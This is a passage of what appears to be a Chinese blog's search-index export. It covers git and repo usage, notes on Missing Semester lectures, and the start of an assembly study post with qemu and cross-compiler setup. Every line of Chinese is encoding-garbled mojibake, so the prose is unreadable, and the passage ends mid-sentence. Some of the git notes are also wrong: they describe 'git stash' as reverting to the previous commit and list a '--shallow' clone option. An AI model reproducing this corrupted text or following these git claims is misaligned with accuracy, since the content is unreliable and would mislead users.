ã€‚æˆ‘ä»¬ä½¿ç”¨å¯ä»¥äººç±»æ–¹ä¾¿é˜…è¯»çš„å­—ç¬¦ä¸²ï¼Œæ˜ å°„åˆ°hashï¼Œç„¶ååœ¨å¯»æ‰¾åˆ°æ–‡ä»¶</p></li><li><p>git å‡ ä¸ªçŠ¶æ€ï¼Œå¯ä»¥çœ‹çœ‹ <a href="https://www.bilibili.com/video/BV1r3411F7kn/?spm_id_from=333.337.search-card.all.click&vd_source=ccaa27461534d3a4a5e9b964672f86d6">Gitå·¥ä½œæµå’Œæ ¸å¿ƒåŸç†</a>ï¼Œéå¸¸æœ‰è¶£ã€‚åœ¨å­¦ä¹ æ—¶ï¼Œå¯ä»¥æƒ³è±¡ä¸€ä¸‹æœ‰å‘æ— ç¯å›¾è¿›è¡Œç†è§£ã€‚</p><ul><li>å·¥ä½œåŒº</li><li>æš‚å­˜åŒº</li><li>æœ¬åœ°ä»“åº“</li><li>è¿œç¨‹ä»“åº“</li></ul></li><li><p>git çš„é…ç½®</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é…ç½®ç”¨æˆ·åï¼Œé‚®ç®±ã€‚è‡ªå·±çš„è´¦æˆ·ã€‚</span></span><br><span class="line">git config --global user.name <span class="string">&quot;your name&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;your email&quot;</span></span><br></pre></td></tr></table></figure><ul><li>åˆ›å»ºä¸€ä¸ªgitä»“åº“</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> demo</span><br><span class="line"><span class="built_in">cd</span> demo</span><br><span class="line"></span><br><span class="line">git init   <span class="comment"># æœ¬åœ°ä»“åº“åˆå§‹åŒ–ï¼Œå‡ºç°ä¸€ä¸ª `.git` çš„ç›®å½•</span></span><br><span class="line"></span><br><span class="line">git status <span class="comment"># æŸ¥çœ‹ä»“åº“çŠ¶æ€ï¼Œéå¸¸å¸¸ç”¨</span></span><br></pre></td></tr></table></figure><ul><li>æ—¥å¿—ï¼ŒæŸ¥çœ‹æäº¤çš„æ–‡ä»¶</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># oneline å»é™¤ä¸€å®šçš„ä¿¡æ¯</span></span><br><span class="line">git <span class="built_in">log</span> --all --graph --decorate --oneline</span><br></pre></td></tr></table></figure><ul><li><p>å…¶ä¸­å­˜åœ¨ä¸€ä¸ª <code>HEAD</code> æŒ‡é’ˆæŒ‡å‘å½“å‰å·¥ä½œçš„åˆ†æ”¯ã€‚</p></li><li><p>æˆ‘ä»¬æƒ³å¿½ç•¥æŸäº›æ–‡ä»¶æ—¶</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨ gitignore æ–‡ä»¶é…ç½®</span></span><br><span class="line"><span class="built_in">touch</span> .gitignore</span><br><span class="line"></span><br><span class="line">*.jpg   <span class="comment"># å¿½ç•¥æ‰€æœ‰çš„ jpgæ–‡ä»¶</span></span><br></pre></td></tr></table></figure><ul><li>æœ¬åœ°æ“ä½œ</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br><span class="line"><span class="comment"># å†™ç‚¹æ–°æ–‡ä»¶</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello&quot;</span> &gt; readme.md  <span class="comment"># å¤„äºuntracked çŠ¶æ€ï¼Œä½¿ç”¨git status ä¼šå­˜åœ¨æç¤º</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æš‚å­˜åŒº</span></span><br><span class="line">git add readme.txt       <span class="comment"># å¤„äºtracked çŠ¶æ€</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æäº¤åˆ°æœ¬åœ°ä»“åº“</span></span><br><span class="line">git commit  <span class="comment"># è¿›å…¥æ–‡ä»¶ï¼Œè¿›è¡Œæè¿°ä¿®æ”¹çš„å†…å®¹</span></span><br><span class="line">-m <span class="string">&quot;message&quot;</span>  <span class="comment"># message ä»£è¡¨æè¿°ï¼Œç®€çŸ­æè¿°å¯ä»¥è¿™æ ·ä½¿ç”¨</span></span><br></pre></td></tr></table></figure><ul><li>æäº¤åˆ°è¿œç¨‹ä»£ç ä»“åº“</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. è¿œç¨‹åˆ›å»ºåç›´æ¥cloneä¸‹æ¥ï¼Œç„¶åå†å†™å†…å®¹</span></span><br><span class="line">git <span class="built_in">clone</span> <span class="string">&quot;your-repo&quot;</span></span><br><span class="line">git remote -v   <span class="comment"># æŸ¥çœ‹å’Œé‚£äº›ä»“åº“æœ‰è”ç³»</span></span><br><span class="line">git push        <span class="comment"># æœ‰.gitæ–‡ä»¶å¤¹ï¼Œå¯ä»¥æ‰¾åˆ°ä»“åº“æäº¤</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. æˆ‘ä»¬åœ¨æœ¬åœ°å†™äº†å¾ˆå¤šæ–‡ä»¶ï¼Œä½†æ˜¯ä¸­é€”æƒ³èµ·æ¥æ²¡æœ‰ä½¿ç”¨gitï¼Œæˆ‘ä»¬å¦‚ä½•åšï¼Ÿ</span></span><br><span class="line"><span class="comment">## è¿˜æ˜¯éœ€è¦å…ˆåˆ›å»ºä»“åº“</span></span><br><span class="line"><span class="comment">## ç„¶åå†æœ¬åœ°</span></span><br><span class="line">git init</span><br><span class="line">git add .</span><br><span class="line">git commit</span><br><span class="line">git remote add <span class="string">&quot;name&quot;</span> git@&lt;your-repo&gt;  <span class="comment"># å…³è”è¿œç¨‹ä»“åº“ã€‚</span></span><br><span class="line"><span class="comment"># name è‡ªå·±å–ï¼Œå¯ä»¥å…³è”å¾ˆå¤šä»“åº“ï¼Œæ ¹æ®åå­—åŒºåˆ†</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## ä½†æ˜¯æœ¬åœ°ä»“åº“ä¸€èˆ¬æ˜¯masterï¼ŒæŸäº›å¹³å°æ˜¯main(ä¹Ÿå¯ä»¥é€‰ï¼Œä½†æ˜¯é»˜è®¤æ˜¯main)ï¼Œè¿™ä¸€æ­¥å¯èƒ½å‡ºé”™ï¼Œéœ€è¦åˆ‡æ¢åˆ†æ”¯ `git checkout -b main`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## è¿œç¨‹åˆ†æ”¯ä¸å­˜åœ¨ä¼šåˆ›å»ºä¸€ä¸ª</span></span><br><span class="line">git push <span class="string">&quot;ä»“åº“åç§°&quot;</span> <span class="string">&quot;æœ¬åœ°åˆ†æ”¯å&quot;</span>:<span class="string">&quot;è¿œç¨‹åˆ†æ”¯å&quot;</span>   <span class="comment"># å¦‚æœæœ¬åœ°åˆ†æ”¯åä¸è¿œç¨‹åˆ†æ”¯åç›¸åŒï¼Œåˆ™å¯ä»¥çœç•¥å†’å·</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## åˆ é™¤è¿œç¨‹ä»“åº“</span></span><br><span class="line">git remote <span class="built_in">rm</span> <span class="string">&quot;ä»“åº“å&quot;</span></span><br></pre></td></tr></table></figure><ul><li>ä»è¿œç¨‹ä»“åº“åˆ°å·¥ä½œåŒºã€‚æ¯”å¦‚å›¢é˜Ÿåˆä½œä¸­ï¼Œè¿œç¨‹ä»“åº“æ›´æ–°äº†ï¼Œæˆ‘ä»¬éœ€è¦å…ˆåŒæ­¥ã€‚</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç›´æ¥åŒæ­¥åˆ°æœ¬åœ°ï¼Œä¼šç›´æ¥æ›´æ–°æœ¬åœ°æ–‡ä»¶</span></span><br><span class="line">git pull</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”±äºpull ä¸€æ­¥åˆ°ä½ï¼Œä¹Ÿå¯åˆ†æ­¥è¿›è¡Œ</span></span><br><span class="line"><span class="comment">## å…ˆæ›´æ–°åˆ°åˆ°æœ¬åœ°ä»“åº“</span></span><br><span class="line">git fetch</span><br><span class="line"><span class="comment">## diff å¯¹æ¯”åŒºåˆ«</span></span><br><span class="line">git diff </span><br><span class="line">    <span class="comment"># æŸ¥çœ‹æœ¬åœ°ä»“åº“å’Œå·¥ä½œåŒºçš„åŒºåˆ«</span></span><br><span class="line"><span class="comment">## pull åˆå¹¶ = git fetch + git merge</span></span><br><span class="line">git pull</span><br></pre></td></tr></table></figure><ul><li><p>åˆ†æ”¯æ“ä½œã€‚æˆ‘ä»¬å‚ä¸å¼€æºé¡¹ç›®æ—¶ï¼Œå»ºè®®åˆ›å»ºä¸€ä¸ªæ–°åˆ†æ”¯pushï¼Œç”±é¡¹ç›®è´Ÿè´£äººå†³å®šæ˜¯å¦åˆå¹¶(merge)ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">git branch <span class="string">&quot;name&quot;</span>  <span class="comment"># åˆ›å»ºä¸€ä¸ªåˆ†æ”¯ </span></span><br><span class="line">-vv   <span class="comment"># æŸ¥çœ‹åˆ†æ”¯ä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line">git checkout <span class="string">&quot;name&quot;</span>  <span class="comment"># åˆ‡æ¢åˆ†æ”¯</span></span><br><span class="line">-d <span class="string">&quot;name&quot;</span>    <span class="comment"># åˆ é™¤åˆ†æ”¯</span></span><br><span class="line">-D <span class="string">&quot;name&quot;</span>    <span class="comment"># æš´åŠ›åˆ é™¤</span></span><br><span class="line">-b <span class="string">&quot;name&quot;</span>    <span class="comment"># åˆ›å»ºä¸€ä¸ªåˆ†æ”¯ç„¶ååˆ‡æ¢</span></span><br><span class="line"></span><br><span class="line">git merge      <span class="comment"># å°†åˆ«çš„åˆ†æ”¯åˆå¹¶åˆ° `å½“å‰åˆ†æ”¯` ä¸­</span></span><br><span class="line"><span class="comment"># å¯èƒ½ä¼šå­˜åœ¨å†²çªï¼Œåœ¨æŸä¸€ä¸ªç›¸åŒçš„ä½ç½®å­˜åœ¨ä¸åŒçš„å†…å®¹.ä¿å­˜çš„è¯ï¼Œè‡ªå·±å†³å®šç„¶åä¿®æ”¹å†²çªæ–‡ä»¶å°±è¡Œ</span></span><br></pre></td></tr></table></figure></li><li><p>git clone ä¼šå¤åˆ¶è¿œç¨‹çš„æ‰€æœ‰æ–‡ä»¶ï¼ŒåŒ…å«å…¶æ‰€æœ‰çš„ <code>snapshot</code> æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>--shallow</code> å¿½ç•¥è¿™äº›</p></li><li><p>git å›æ»šï¼šå½“æˆ‘ä»¬åœ¨ä¸€ä¸ªåˆ†æ”¯ä¸­<code>commit</code>åå‘ç°ä¸€ä¸ªå·¨å¤§çš„é”™è¯¯ï¼Œéœ€è¦å›é€€åˆ°ä¹‹å‰çš„ç‰ˆæœ¬ã€‚æ”¹å˜ <code>HEAD</code> æŒ‡é’ˆ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">git stash   <span class="comment"># å›é€€åˆ°ä¸Šä¸€ä¸ªcommit ç‰ˆæœ¬</span></span><br><span class="line">git bisect  <span class="comment"># æ¯”è¾ƒå¼ºå¤§çš„å·¥å…·</span></span><br><span class="line"></span><br><span class="line">git reset </span><br><span class="line">--hard         <span class="comment"># ä¼šä¸¢å¤±æœ€æ–°çš„ä»£ç ä¿®æ”¹</span></span><br><span class="line">--soft         <span class="comment"># å°† HEAD æŒ‡é’ˆå›é€€åˆ°æŒ‡å®šæäº¤ï¼Œä¸æ”¹å˜æš‚å­˜åŒºå’Œå·¥ä½œåŒºçš„å†…å®¹</span></span><br><span class="line"></span><br><span class="line">HEAD^       <span class="comment"># ä¸Šä¸€ä¸ª ç‰ˆæœ¬</span></span><br><span class="line">HEAD~&lt;num&gt;  <span class="comment"># å›é€€numä¸ªç‰ˆæœ¬</span></span><br><span class="line">&lt;<span class="built_in">hash</span>&gt;      <span class="comment"># å›é€€åˆ°æŒ‡å®šå“ˆå¸Œå€¼çš„ç‰ˆæœ¬</span></span><br><span class="line"></span><br><span class="line">git revert -n <span class="built_in">hash</span>   <span class="comment"># å°†ç‰ˆæœ¬å¤åˆ¶ä¸€ä»½ï¼Œä¸ä¼šé”€æ¯</span></span><br></pre></td></tr></table></figure></li><li><p>ç°åœ¨çš„IDEä¸­å­˜åœ¨gitç›¸å…³çš„å·¥å…·ï¼Œä¹Ÿæ›´åŠ æ–¹ä¾¿äº†æˆ‘ä»¬çš„ä½¿ç”¨ã€‚</p></li><li><p>ä¹Ÿå­˜åœ¨å…¶ä½™çš„ç‰ˆæœ¬æ§åˆ¶å·¥å…·ï¼Œsvn, repoâ€¦â€¦</p></li></ul><h3 id="repo-ä½¿ç”¨"><a href="#repo-ä½¿ç”¨" class="headerlink" title="repo ä½¿ç”¨"></a>repo ä½¿ç”¨</h3><ul><li><p><a href="https://source.android.google.cn/docs/setup/create/repo?hl=zh-cn#start">repo</a> æ›´é€‚åˆå¤šä¸ªä»“åº“çš„ç®¡ç†ï¼Œå¹³å¸¸æˆ‘ä»¬è§çš„é¡¹ç›®éƒ½æ˜¯ä¸€ä¸ªä»“åº“ã€‚ä½†æ˜¯å‘Androidè¿™æ ·çš„ä¾èµ–ä¸Šç™¾ä¸ªgitä»“åº“æ¥è¯´ï¼Œä¾é gitå¹¶ä¸æ˜¯å¤šä¹ˆå¥½ä½¿ç”¨ï¼Œå› æ­¤google å¼€å‘äº†repoå·¥å…·ï¼Œæœ¬è´¨æ˜¯ä¸€ä¸ªpythonè„šæœ¬ï¼ŒåŸºäºgitã€‚</p></li><li><p>åˆå§‹åŒ–</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">repo init</span><br><span class="line">-u git@&lt;repo&gt;/mainfest.git  <span class="comment"># é»˜è®¤ä¸ºgoogleçš„ä»“åº“ https://gerrit.googlesource.com/git-repo</span></span><br><span class="line"><span class="comment"># è¿™ä¸ªç›®å½•ä¸‹æœ€ç®€å•åªéœ€è¦ default.xml</span></span><br><span class="line">-b  <span class="comment"># æŒ‡å®šbranch</span></span><br></pre></td></tr></table></figure><ul><li>-uåçš„ä»“åº“, xmlæ–‡ä»¶(é»˜è®¤<code>default.xml</code>, æˆ‘ä»¬å¯ä»¥è‡ªå·±é€‰æ‹©)ï¼Œç„¶åæˆ‘ä»¬æ‹‰å–çš„æ—¶å€™ä¼šå°†æ‰€æœ‰çš„gitä»“åº“æ‹‰å–ä¸‹æ¥</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">repo init -u &lt;repo&gt;</span><br><span class="line">-m æŒ‡å®šxmlæ–‡ä»¶</span><br></pre></td></tr></table></figure><ul><li>æ‹‰å–ä»£ç åˆ°æœ¬åœ°</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">repo <span class="built_in">sync</span> -c</span><br></pre></td></tr></table></figure><ul><li>åˆ†æ”¯</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">repo branch  <span class="comment"># æŸ¥çœ‹åˆ†æ”¯</span></span><br><span class="line"></span><br><span class="line">repo start &lt;branch_name&gt; --all <span class="comment"># åˆ›å»ºåˆ†æ”¯å¹¶è¿›å…¥</span></span><br></pre></td></tr></table></figure><h2 id="lecture7-debugging-profiling"><a href="#lecture7-debugging-profiling" class="headerlink" title="lecture7: debugging &amp; profiling"></a>lecture7: debugging &amp; profiling</h2><blockquote><p>è°ƒè¯•ç¨‹åºä»¥åŠæ€§èƒ½åˆ†æ</p></blockquote><ul><li><p>æŸ¥çœ‹æ—¥å¿—ï¼Œæ‰“å°æ—¥å¿—ï¼Œåˆ¶ä½œæ—¥å¿—</p></li><li><p>è°ƒè¯•å™¨</p><ul><li>GNU gdbï¼Œå¯ä»¥è°ƒè¯•å‡ ä¹æ‰€æœ‰çš„äºŒè¿›åˆ¶ç¨‹åº</li><li>python pdbï¼Œpythonè°ƒè¯•</li><li>æµè§ˆå™¨è°ƒè¯•js</li></ul></li><li><p>æ€§èƒ½æµ‹è¯•</p><ul><li>æµ‹è¯•ä¸€ä¸ªç¨‹åºè¿è¡Œ time</li></ul></li></ul><h2 id="lecture8-metaprogramming"><a href="#lecture8-metaprogramming" class="headerlink" title="lecture8: metaprogramming"></a>lecture8: metaprogramming</h2><ul><li><p>å¦‚ä½•æ›´é«˜çš„ç®¡ç†é¡¹ç›®ã€æµ‹è¯•ã€ä¾èµ–ç®¡ç†ã€‚ä½¿ç”¨ <code>makefile</code></p></li><li><p>makefile çš„ä½¿ç”¨æ¯”è¾ƒç®€å•ã€‚</p></li></ul><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">ç›®æ ‡: ä¾èµ–</span></span><br><span class="line">å‘½ä»¤  //å‰é¢å¿…é¡»æ˜¯tabé”®</span><br><span class="line"></span><br><span class="line"><span class="section">main: main.c</span></span><br><span class="line">gcc main.c -o mian</span><br></pre></td></tr></table></figure><ul><li>ä¸€äº›è¯­æ³•</li></ul><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$^</span>   æ‰€æœ‰çš„ä¾èµ–é¡¹</span><br><span class="line"><span class="variable">$&lt;</span>   ä¸€ä¸ªä¾èµ–é¡¹</span><br><span class="line"><span class="variable">$@</span>   ç›®æ ‡æ–‡ä»¶</span><br><span class="line">echo æ‰“å°</span><br><span class="line">%    é€šé…ç¬¦</span><br><span class="line">*    ä¹Ÿæ˜¯é€šé…ç¬¦</span><br></pre></td></tr></table></figure><ul><li>æˆ‘ä»¬ç¼–è¯‘æŸäº›å¼€æºé¡¹ç›®æ—¶ä¹Ÿä¼šä½¿ç”¨ <code>make</code> å‘½ä»¤ï¼Œå¯ä»¥çœ‹çœ‹åˆ«äººæ€ä¹ˆå†™çš„ã€‚</li><li>å½“ç„¶ï¼Œè¿˜æœ‰å…¶ä»–çš„é€‰æ‹©ï¼Œæ¯”å¦‚ <code>cmake</code></li></ul><h2 id="lecture9-security-crypto"><a href="#lecture9-security-crypto" class="headerlink" title="lecture9: security &amp; crypto"></a>lecture9: security &amp; crypto</h2><blockquote><p>å®‰å…¨å¾ˆå¤šï¼Œä¹Ÿæ˜¯ä¸€é—¨ä¸“é—¨çš„å­¦ç§‘ï¼Œæƒ³è¦æ·±å…¥å°±éœ€è¦å­¦ä¸“ä¸šè¯¾</p></blockquote><ul><li><p>hash: ç”¨ä½œä¿¡æ¯æ‘˜è¦ï¼Œç­¾åï¼Œæ£€æŸ¥æ–‡ä»¶çš„å®Œæ•´æ€§ã€‚</p><ul><li>md5</li><li>sha-1&#x2F;2&#x2F;3</li></ul></li><li><p>å¯¹ç§°åŠ å¯†</p><ul><li>DES</li><li>AES</li></ul></li><li><p>éå¯¹ç§°åŠ å¯†</p><ul><li>RSA</li><li>ECC</li></ul></li><li><p>æ•°å­—ç­¾å</p></li></ul><h2 id="lecture10-potpourri"><a href="#lecture10-potpourri" class="headerlink" title="lecture10: potpourri"></a>lecture10: potpourri</h2><blockquote><p>å¤§æ‚çƒ©ï¼šè®²è¿°ä¸€äº›æ¦‚å¿µï¼Œç†Ÿç»ƒè¿˜å¾—åœ¨ä»¥åå¤šç»ƒä¹ </p></blockquote><ul><li><p>é”®ç›˜æ˜ å°„</p><ul><li>é”®ç›˜ä¸Šçš„<code>Caps Lock</code>å‡ ä¹ä¸æ€ä¹ˆä½¿ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥é‡æ–°é…ç½®ä¸€ä¸‹(æ¯”å¦‚æ¯”è¾ƒå°çš„Esc)ï¼Œè®©å…¶å‘æŒ¥ä½œç”¨</li></ul></li><li><p>å®ˆæŠ¤è¿›ç¨‹ï¼Œdaemon</p></li><li><p>APIs</p><ul><li>æ¯”å¦‚è¯´éƒ¨åˆ†å¤©æ°”çš„APIï¼Œæˆ‘ä»¬åªéœ€è¦è¯·æ±‚ç‰¹å®šçš„URLå¸¦ç€æ­£ç¡®çš„å‚æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥è·å¾—è¿”å›ç»“æœã€‚</li></ul></li><li><p>å‘½ä»¤è¡Œå‚æ•°</p><ul><li>æˆ‘ä»¬ä½¿ç”¨çš„å‘½ä»¤å¯ä»¥å¸¦æœ‰å‚æ•°</li></ul></li><li><p>Window Manage</p></li><li><p>VPN</p></li><li><p>Jupyter Notebook: äº¤äº’å¼ç¼–ç¨‹</p></li><li><p>GitHub: ä»£ç æ‰˜ç®¡å¹³å°</p><ul><li>åˆ›å»ºè‡ªå·±çš„ä»“åº“</li><li>æissueï¼Œè§£å†³é—®é¢˜</li><li>pr: pull requestï¼Œè‡ªå·±å†™çš„æäº¤ç»™ä½œè€…</li><li>merge åˆ«äººçš„è¯·æ±‚</li></ul></li></ul><h2 id="lecture11-Q-A"><a href="#lecture11-Q-A" class="headerlink" title="lecture11: Q&amp;A"></a>lecture11: Q&amp;A</h2><blockquote><p>æ¥è‡ªå­¦ç”Ÿçš„é—®é¢˜</p></blockquote><ul><li>å¦‚ä½•è¿›è¡Œæ“ä½œç³»ç»Ÿçš„å­¦ä¹ ï¼Ÿ<ul><li>learn by exercise: å­¦ä¹ æ¯”è¾ƒå‡ºåçš„ OS è¯¾ç¨‹ï¼Œå®Œæˆç›¸åº”çš„labï¼Œå®ç°è‡ªå·±çš„OS</li></ul></li></ul><p>â€¦â€¦ è‡ªå·±çœ‹çœ‹å°±è¡Œ</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
            <tag> vim </tag>
            
            <tag> terminal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ±‡ç¼–å­¦ä¹ </title>
      <link href="/2023/06/10/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/06/10/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>åŸºæœ¬çš„æ±‡ç¼–å­¦ä¹ ã€‚</p></blockquote><span id="more"></span><ul><li><p>å­¦ä¹ ç›®æ ‡ï¼šé¦–å…ˆèƒ½çœ‹æ‡‚ã€‚ç„¶åå°è¯•ç¼–å†™ <code>shellcode</code>ã€‚</p></li><li><p>ä¸ªäººä¹ æƒ¯å°å†™æŒ‡ä»¤ã€‚</p></li><li><p><code>little-endian</code></p></li><li><p>å¸¸è§çš„æ±‡ç¼–æ ¼å¼</p><ul><li>Intelæ ¼å¼ã€‚</li><li>AT&amp;Tï¼Œå®é™…ä½¿ç”¨ä¹Ÿå¾ˆå¸¸è§(Linuxä¸­é»˜è®¤çš„æ ¼å¼)</li></ul></li><li><p>éƒ¨åˆ†åè¯</p></li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ISA: Instruction Set Architecture, æŒ‡ä»¤é›†æ¶æ„</span><br><span class="line">RISC: Reduced Instruction Set Computer, ç²¾ç®€æŒ‡ä»¤é›†è®¡ç®—æœº</span><br><span class="line">CISC: Complex Instruction Set Computer, å¤æ‚æŒ‡ä»¤é›†è®¡ç®—æœº</span><br><span class="line">ABI: application binary interface</span><br></pre></td></tr></table></figure><h2 id="ç¯å¢ƒé—®é¢˜"><a href="#ç¯å¢ƒé—®é¢˜" class="headerlink" title="ç¯å¢ƒé—®é¢˜"></a>ç¯å¢ƒé—®é¢˜</h2><ul><li><p>æœ¬æœº linux: ubuntu &amp;&amp; kali virtual machineï¼›CPU: AMDã€‚</p><ul><li>æ— æ³•ç›´æ¥è¿è¡Œ <code>arm</code> å’Œ <code>mips</code> æ¶æ„çš„ç¨‹åº</li></ul></li><li><p>armå¯ä»¥ä½¿ç”¨æ‰‹æœºç»ˆç«¯ <a href="https://termux.dev/en/">Termux</a> è¿›è¡Œè¿è¡Œã€‚æˆ–è€…è´­ä¹°äº‘æœåŠ¡å™¨?</p></li></ul><h3 id="ç¯å¢ƒå®‰è£…"><a href="#ç¯å¢ƒå®‰è£…" class="headerlink" title="ç¯å¢ƒå®‰è£…"></a>ç¯å¢ƒå®‰è£…</h3><ul><li><p>åŸºæœ¬ç¯å¢ƒ <code>user mode+kernel mode</code>ã€‚ </p><ul><li>è¿è¡Œç¨‹åºåªéœ€è¦ä¸€ä¸ª<code>qemu-user</code> å°±è¡Œï¼Œå¯åŠ¨ç³»ç»Ÿéœ€è¦ <code>qemu-system-xxx</code></li><li>ç”šè‡³å¯ä»¥ <code>qemu-system</code> è·‘kernelï¼Œç„¶åè·‘ç¨‹åºğŸ˜‚<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># qemu userç”¨æˆ·æ€ systemå¯åŠ¨å†…æ ¸é•œåƒ</span></span><br><span class="line">sudo apt install qemu-user</span><br></pre></td></tr></table></figure></li></ul></li><li><p>arm ç¯å¢ƒ</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gun ç¼–è¯‘å·¥å…·é“¾ + åŠ¨æ€é“¾æ¥åº“</span></span><br><span class="line">sudo apt list gcc* | grep arm</span><br><span class="line">sudo apt install gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu</span><br><span class="line"></span><br><span class="line"><span class="comment"># optional: qemu arm system mode</span></span><br><span class="line">sudo apt list  <span class="string">&quot;qemu*&quot;</span> <span class="comment"># å¯»æ‰¾å¯¹ç”¨çš„arch</span></span><br><span class="line">sudo apt install qemu-system-arm qemu-system-aarch64</span><br></pre></td></tr></table></figure><ul><li>mips ç¯å¢ƒ.</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gun ç¼–è¯‘å·¥å…·é“¾</span></span><br><span class="line">sudo apt install gcc-mips-linux-gnu gcc-mips64-linux-gnuabi64 gcc-mipsel-linux-gnu gcc-mips64el-linux-gnuabi64</span><br><span class="line"></span><br><span class="line"><span class="comment"># optional: qemu mips system mode, ç›®å‰æ²¡è§è¿‡ï¼Œ user mode åº”è¯¥å¤Ÿäº†</span></span><br><span class="line">sudo apt install qemu-system-mips</span><br></pre></td></tr></table></figure><ul><li>gdb</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gdb gdb-multiarch</span><br></pre></td></tr></table></figure><h3 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h3><ul><li><p>qemu-user ä½¿ç”¨ <code>-g</code> gdbæ¨¡å¼ ç¡®å®šgdbè°ƒè¯•ç«¯å£</p></li><li><p>qemu-system ä½¿ç”¨ <code>-s -S  æˆ–è€… 